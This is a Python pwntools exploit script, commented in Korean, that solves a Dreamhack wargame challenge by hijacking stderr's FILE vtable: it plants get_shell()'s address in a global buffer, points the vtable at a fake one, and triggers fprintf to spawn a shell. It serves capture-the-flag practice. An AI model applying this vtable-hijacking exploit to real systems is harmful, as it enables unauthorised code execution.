from pwn import *

# 디버깅이 편하도록 로그 레벨을 debug로 설정하고, 아키텍처 지정
context.log_level = 'debug'
context.arch = 'amd64'

# 접속 정보 설정
target_host = "host8.dreamhack.games"
target_port = 20719

binary_path = './iofile_vtable'
elf = ELF(binary_path)

# 필요한 주소 추출 (No PIE 환경이므로 고정 주소 사용)
get_shell_addr = elf.sym['get_shell']
name_addr = elf.sym['name']

log.info("=" * 40)
log.info(f"[*] get_shell() Function Address : {hex(get_shell_addr)}")
log.info(f"[*] 'name' Global Variable Addr  : {hex(name_addr)}")
log.info("=" * 40)

# 서버 연결
p = remote(target_host, target_port)
# 로컬에서 테스트할 경우 아래 주석을 해제하여 사용하세요.
# p = process(binary_path) 

# Step 1: name 전역 변수에 get_shell() 주소 저장
# 페이로드: p64(get_shell_addr)
payload_name = p64(get_shell_addr)
log.info(f"[Step 1] Sending get_shell_addr to 'name': {enhex(payload_name)}")
p.sendafter(b"what is your name: ", payload_name)

# Step 2: vtable 포인터 변조를 위해 4번 chance 메뉴 선택
# _IO_xsputn 오프셋이 0x38이므로, Fake vtable의 베이스를 name_addr - 0x38 로 맞춤
fake_vtable_addr = name_addr - 0x38
log.info(f"[Step 2] Calculating Fake vtable address (name_addr - 0x38) : {hex(fake_vtable_addr)}")

p.sendlineafter(b"> ", b"4")

payload_vtable = p64(fake_vtable_addr)
log.info(f"[*] Overwriting stderr's vtable pointer with: {enhex(payload_vtable)}")
p.sendafter(b"change: ", payload_vtable)

# Step 3: fprintf(stderr, ...)를 호출하여 조작된 vtable의 _IO_xsputn 실행 유도
log.info(f"[Step 3] Choosing option 2 'error' to trigger fprintf() and execute get_shell()")
p.sendlineafter(b"> ", b"2")

# Step 4: 쉘 획득 후 인터랙티브 모드 진입
log.success("[+] Vtable Hijacking Successful! Got Shell!")
log.info("[*] Run 'cat flag' to get your flag.")
p.interactive()